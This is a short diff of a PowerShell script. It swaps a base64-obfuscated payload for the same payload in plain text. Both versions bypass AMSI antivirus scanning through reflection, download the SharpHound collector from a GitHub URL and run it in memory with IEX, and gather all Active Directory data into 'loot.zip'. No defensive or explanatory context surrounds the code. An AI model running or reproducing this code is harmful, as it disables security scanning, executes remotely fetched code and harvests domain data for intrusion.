@@ -1,5 +1,4 @@
-$b64 = @"
-W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgic3lzdGVtLm1hbmFnZW1lbnQuYXV0b21hdGlvbi5BbXNpVXRpbHMiKS5HZXRGaWVsZCgiYW1zaUluaXRGYWlsZWQiLCJOb25QdWJsaWMsU3RhdGljIikuU2V0VmFsdWUoJG51bGwsJHRydWUpOyBJRVggKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vU3BlY3Rlck9wcy9CbG9vZEhvdW5kLUxlZ2FjeS9tYXN0ZXIvQ29sbGVjdG9ycy9TaGFycEhvdW5kLnBzMScpOyBJbnZva2UtQmxvb2RIb3VuZCAtQ29sbGVjdGlvbk1ldGhvZCBBbGwgLVppcEZpbGVOYW1lIGxvb3Quemlw
-"@ -replace "`r|`n", ""
-$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
-Invoke-Command -ScriptBlock ([ScriptBlock]::Create($decoded))
+$script = '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/master/Collectors/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip'
+
+$sb = [ScriptBlock]::Create($script)
+& $sb
